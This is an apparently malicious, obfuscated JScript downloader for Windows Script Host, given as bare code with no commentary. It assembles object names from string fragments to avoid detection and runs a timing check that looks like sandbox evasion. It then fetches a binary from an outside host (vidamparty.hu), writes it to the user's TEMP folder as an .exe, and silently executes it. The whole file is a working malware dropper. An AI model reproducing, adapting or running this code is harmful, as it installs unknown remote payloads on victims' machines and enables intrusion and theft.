var AT = false;
var L = "Create"+"Object";
var A = function ND() {return WScript[L]("WScript"+".Shell");}(), Y0 = 11;
var X = "MSXML2"+".XMLHTTP";
var L0 = 2;
var XS = L0 - 2;
function WN(E){A["Run"](E, XS, XS);};
function IQ(){return X + "";};
function YR(AC, B){XS = XS * 1; return AC - B;};
function KJ(){return L;};
/*@cc_on
  @if (@_win32 || @_win64)
    AT = true;
  @end
@*/
if (AT)
{
var XR = "";
function DI(){return 22;};
var LH = 0; var EY = 0;
function Z()
{
var QG = new this["Date"]();
var Y = QG["getUTCMilliseconds"]();
WScript["Sleep"](DI());
var QG = new this["Date"]();
var K = QG["getUTCMilliseconds"]();
WScript["Sleep"](DI());
var QG = new this["Date"]();
var CN = QG["getUTCMilliseconds"]();
var LH = "DP";
LH = YR(K, Y);
var EY = "MR";
EY = YR(CN, K);
XR = "open";
return YR(LH, EY);
}
var GG = false;
var S = false;
for (var HO = XS; HO < DI() * 1; HO++){if (Z() != XS){
GG = true; 
EY = "31" + 11 * LH + EY; 
S = true; 
break;
}}
function O() {return ((GG == true) && (GG == S)) ? 1 : XS;};
if (GG && O() && S){
function SD() {return A["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "bbx6GRSzMQYAnsX.ex" + "e";};
 C = IQ();
 PB = WScript[L](C);
 var JN = 1;
do { 
	for (;JN;){
	try {
		if (JN == 1)
		{
			PB[XR]("GET", "http://vidamparty.hu/as0ldr", false);
			PB["send"]();
			O0 = "Sleep";
			JN = 2;
		}
		WScript[O0](DI() + 120); 
		if (PB["readystate"] < 2 * 2) continue;
		JN = XS;
		function U(Z0) {var OR = (1, 2, 3, 4, 5, Z0); return OR;};
		O1 = WScript[KJ()]("ADODB.Stream");
		C = O1;
		C[XR]();
		C["type"] = U(1);
		C["write"](PB["ResponseBody"]);
		O1["position"] = U(XS);
		C["Save" + "ToFile"](SD(), 2);
		O1["cl"+"ose"]();
		QL = SD();
		WN(QL);
	} catch(E0){};};
}while (JN);
}
}

